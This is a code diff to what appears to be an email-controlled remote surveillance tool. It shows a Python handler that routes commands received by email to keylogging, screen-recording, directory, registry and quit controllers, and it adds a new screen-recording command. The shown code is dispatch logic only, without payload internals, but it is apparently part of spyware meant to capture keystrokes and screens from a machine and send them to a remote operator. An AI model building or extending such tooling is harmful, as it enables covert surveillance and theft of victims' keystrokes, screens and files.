@@ -6,6 +6,7 @@ from EmailTemplate import EmailTemplate
 from Controls.RegistryControl import RegistryControl 
 from Controls.KeyloggerControl import KeyloggerControl
 from Controls.FileControl import FileControl
+from Controls.ScreenRecordControl import ScreenRecordControl
 
 def HandleRequest(request, emailTemplate):
     emailFrom = request["From"]
@@ -18,10 +19,7 @@ def HandleRequest(request, emailTemplate):
         emailFrom = request["From"]
 
         if( method != "KEYLOG"
-            and method != "SD_LO"
-            and method != "LIVESCREEN"
-            and method != "APP_PRO"
-            and method != "MAC"
+            and method != "SCREENRECORD"
             and method != "DIRECTORY"
             and method != "REGISTRY"
             and method != "QUIT"):
@@ -42,6 +40,11 @@ def HandleRequest(request, emailTemplate):
         if(method == "REGISTRY"):
             controller = RegistryControl(emailTemplate, emailFrom)
             return controller.RegistryHandle()
+        if(method == "SCREENRECORD"):
+            controller = ScreenRecordControl(emailTemplate, emailFrom)
+            return controller.Handle()
+        if(method == "QUIT"):
+            exit(0)
     except:
         response = {
                 "isSuccess": False,
